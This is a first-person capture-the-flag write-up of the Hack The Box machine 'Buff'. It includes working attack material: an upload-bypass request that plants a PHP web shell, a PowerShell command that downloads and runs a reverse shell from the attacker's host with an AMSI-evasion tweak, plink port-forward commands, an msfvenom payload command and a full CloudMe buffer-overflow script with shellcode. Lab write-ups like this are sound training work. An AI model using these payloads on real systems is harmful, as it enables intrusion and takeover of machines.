---
title: Buff
tags: windows
description: Write-up for Hack the Box - Buff
---

![2021-08-30_10-16.png](/home/sixstringacks/share/git/tmp_assets/70656e89f15931a6db962472014db9843639f826.png)

## Overview

Buff is a Windows 10 box running XAMPP thats hosts a site offering fitness packages that allowed anonymous upload and bypass of file upload filtering. From here I uploaded a web shell that was used to create a reverse shell for the initial foothold. A buffer overflow in an application called CloudMe allowed for privilege escalation to administrator.

## Enumeration

**Software**

* Windows 10 1803
* Apache httpd 2.4.43
* OpenSSL/1.1.1g 
* PHP/7.4.6
* xampp 7.4.6

**Open Ports**

```
nmap -vv --reason -Pn -sT -A --osscan-guess -p- -oN results/10.10.10.198/scans/_full_tcp_nmap.txt
```

* 7680/tcp - pando-sub?
* 8080/tcp - http

**File/Directory Brute Force**

```
gobuster dir -w http://10.10.10.198 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 25
```

* home.php

* index.php

* contact.php

* facilities.php

* register.php

* feedback.php

* upload.php

* packages.php

* about.php

* edit.php

* /license

* up.php

* att.php

## Steps (User)

I started by browsing to the site hosted on port 8080 and was presented with web page titled "mrb3n's Bro Hut" that sells fitness packages.

![2021-08-31_16-52.png](/home/sixstringacks/share/git/tmp_assets/5d3332bfdb0befac38797df173c45dadb5f15043.png)

After reviewing the Gobuster results and poking around the websiet I did not find anything interesting. I was grasping at straws but I noticed the contact form showed that the site was using Gym Management Software 1.0, so I decided to look it up in exploit-db and found an exploit for it. 

![2021-08-31_17-01.png](/home/sixstringacks/share/git/tmp_assets/2e3b716da89701eaaee9a8c09637620f21cffa9d.png)

I reviewed the [exploit](https://www.exploit-db.com/exploits/48506) to figure out what it was doing; basically the site allows for files to be uploaded anonymously and for its file upload filtering to be bypassed. I decided to use burp instead so I created a post request and uploaded my own web shell (using my own, easier to type, parameter names). 

```
POST /upload.php?id=shell HTTP/1.1
Host: 10.10.10.198:8080
User-Agent: python-requets/2.26.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: sec_session_id=imvsd39u14p4kmuk5dm61dkhkg
Content-Length: 320
Content-Type: multipart/form-data; boundary=ab675be8aa6636037d9e756e7fbfd4ea


--ab675be8aa6636037d9e756e7fbfd4ea
Content-Disposition: form-data; name="pupload"

upload
--ab675be8aa6636037d9e756e7fbfd4ea
Content-Disposition: form-data; name="file"; filename="webshell.php.png"
Content-Type: image/png

PNG

<?php echo shell_exec($_GET["cmd"]); ?>
--ab675be8aa6636037d9e756e7fbfd4ea--
```

![2021-08-30_16-25.png](/home/sixstringacks/share/git/tmp_assets/dcd0b2705a1bf4d239f6dfaefe5e42126338800b.png)

Command execution

![2021-08-30_13-42_1.png](/home/sixstringacks/share/git/tmp_assets/3d8414508b93585443c020b23bf5593ff9507b66.png)

Now that I had command execution I could try for a reverse shell. I went with Nishang's Invoke-PowerShellTcp.ps1 script. To prevent AMSI from blocking it I removed the comments, changed the name of the function to ipst, and added a function all at the bottom of the script so it would get executed immediately. 

![2021-08-31_17-15.png](/home/sixstringacks/share/git/tmp_assets/e3ac5364fcc7bee2712534b74e4131972134d994.png)

I started a netcat listener, a simple python http server to host ipst.ps1 and used the webshell to execute Powershell Invoke-Expression, specifying the url to ipst.ps1 and received a call back and shell as user "shaun"

```
GET /upload/shell.php?cmd=powershell+-nop+-exec+bypass+-c+"IEX+(New-Object+Net.WebClient).DownloadString('http%3a//10.10.14.7/ipst.ps1')%3bipst.ps1" HTTP/1.1
Host: 10.10.10.198:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: sec_session_id=imvsd39u14p4kmuk5dm61dkhkg
Connection: close
```

![2021-08-31_17-27.png](/home/sixstringacks/share/git/tmp_assets/9a0a9eb6d033dd888804b87c413d3a1cbf55b7e1.png)

## Steps (root/system)

I went into a bit of a rabbit hole here, while enumerating the file system I found a file called "new text document.txt" that contained mysql credentials

![2021-08-30_17-04.png](/home/sixstringacks/share/git/tmp_assets/251c6da3f67418f6e061ca3c9554d1e88fee208e.png)

Running a netstat I noticed that the mysql server was running on 3306, but was only accessible to local host. I uploaded plink.exe to the machine so I could create a reverse port forward and access the port from my machine. I was able to connet to mysql with root and no password but there was nothing useful there.

```
echo y | .\plink.exe -ssh -l **** -pw "****" -P 2222 -R 8889:127.0.0.1:3306 10.10.14.7
```

Later I came across en executable in the Downloads folder called CloudMe_1112.exe, and cofirmed that a service was running under the same name. I searched for informaton about it and learned that it was some sort of a file sharing and syncronization app, and it runs on the local machine on port 8888. Once again this was only accessible from localhost but I felt like I was finally on the right track.

![2021-08-31_17-34.png](/home/sixstringacks/share/git/tmp_assets/5deaa7e25087785a2c92e8cdfffc1f651c292890.png)

I searched for Cloudme exploits and there were quite a few. Before I could start testing exploits I needed a connection to port 8888. I fired up plink again and this time I forwarded local port 8888 to my box.

```
echo y | .\plink.exe -ssh -l **** -pw "****" -P 2222 -R 9001:127.0.0.1:8888 10.10.14.7
```

There was quite a bit of trial an error involved in creating a working exploit for this. Some of the older ones on exploit-db.com were not working so I settled on [48389](https://www.exploit-db.com/exploits/48389) to use as a starting point because it was released a little closer to when the box was created. 

I used msfvenom for generating the payload in python format

```
msfvenom -a x86 -p windows/shell_reverse_tcp -b '\x00\x0A\x0D' lhost=10.10.14.7 lport=4201 -f python 
```

I updated the script with the payload, making sure the right port (9001) was set.

```
import socket
import sys

target = "127.0.0.1"

buf = \x90" * 1052
ret = "\xb5\x42\xa8\x68"
nopsled = "\x90"*30 # NOP sled 

# Payload
payload = b"\xbe\x34\xa1\x16\xa8\xdb\xd1\xd9\x74\x24\xf4\x5d"
payload += b"\x29\xc9\xb1\x52\x31\x75\x12\x03\x75\x12\x83\xf1"
payload += b"\xa5\xf4\x5d\x05\x4d\x7a\x9d\xf5\x8e\x1b\x17\x10"
payload += b"\xbf\x1b\x43\x51\x90\xab\x07\x37\x1d\x47\x45\xa3"
payload += b"\x96\x25\x42\xc4\x1f\x83\xb4\xeb\xa0\xb8\x85\x6a"
payload += b"\x23\xc3\xd9\x4c\x1a\x0c\x2c\x8d\x5b\x71\xdd\xdf"
payload += b"\x34\xfd\x70\xcf\x31\x4b\x49\x64\x09\x5d\xc9\x99"
payload += b"\xda\x5c\xf8\x0c\x50\x07\xda\xaf\xb5\x33\x53\xb7"
payload += b"\xda\x7e\x2d\x4c\x28\xf4\xac\x84\x60\xf5\x03\xe9"
payload += b"\x4c\x04\x5d\x2e\x6a\xf7\x28\x46\x88\x8a\x2a\x9d"
payload += b"\xf2\x50\xbe\x05\x54\x12\x18\xe1\x64\xf7\xff\x62"
payload += b"\x6a\xbc\x74\x2c\x6f\x43\x58\x47\x8b\xc8\x5f\x87"
payload += b"\x1d\x8a\x7b\x03\x45\x48\xe5\x12\x23\x3f\x1a\x44"
payload += b"\x8c\xe0\xbe\x0f\x21\xf4\xb2\x52\x2e\x39\xff\x6c"
payload += b"\xae\x55\x88\x1f\x9c\xfa\x22\xb7\xac\x73\xed\x40"
payload += b"\xd2\xa9\x49\xde\x2d\x52\xaa\xf7\xe9\x06\xfa\x6f"
payload += b"\xdb\x26\x91\x6f\xe4\xf2\x36\x3f\x4a\xad\xf6\xef"
payload += b"\x2a\x1d\x9f\xe5\xa4\x42\xbf\x06\x6f\xeb\x2a\xfd"
payload += b"\xf8\x1e\xa1\xf3\xff\x76\xb7\x0b\x10\xee\x3e\xed"
payload += b"\x7a\xe0\x16\xa6\x12\x99\x32\x3c\x82\x66\xe9\x39"
payload += b"\x84\xed\x1e\xbe\x4b\x06\x6a\xac\x3c\xe6\x21\x8e"
payload += b"\xeb\xf9\x9f\xa6\x70\x6b\x44\x36\xfe\x90\xd3\x61"
payload += b"\x57\x66\x2a\xe7\x45\xd1\x84\x15\x94\x87\xef\x9d"
payload += b"\x43\x74\xf1\x1c\x01\xc0\xd5\x0e\xdf\xc9\x51\x7a"
payload += b"\x8f\x9f\x0f\xd4\x69\x76\xfe\x8e\x23\x25\xa8\x46"
payload += b"\xb5\x05\x6b\x10\xba\x43\x1d\xfc\x0b\x3a\x58\x03"
payload += b"\xa3\xaa\x6c\x7c\xd9\x4a\x92\x57\x59\x7a\xd9\xf5"
payload += b"\xc8\x13\x84\x6c\x49\x7e\x37\x5b\x8e\x87\xb4\x69"
payload += b"\x6f\x7c\xa4\x18\x6a\x38\x62\xf1\x06\x51\x07\xf5"
payload += b"\xb5\x52\x02"

exploit = buf + ret + nopsled + payload

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,9001))
    s.send(exploit)

except Exception as e:
    print(sys.exc_value)
```

With plink remote port forwarding port 9001, the exploit ready to go, and a netcat listener started I ran the script and received a shell as administrator with access to the root flag.

<img title="" src="file:///home/sixstringacks/share/git/tmp_assets/ed70b2b89e370085855467bdc2f9d0bd3c80c274.png" alt="2021-08-31_10-31.png" width="696">
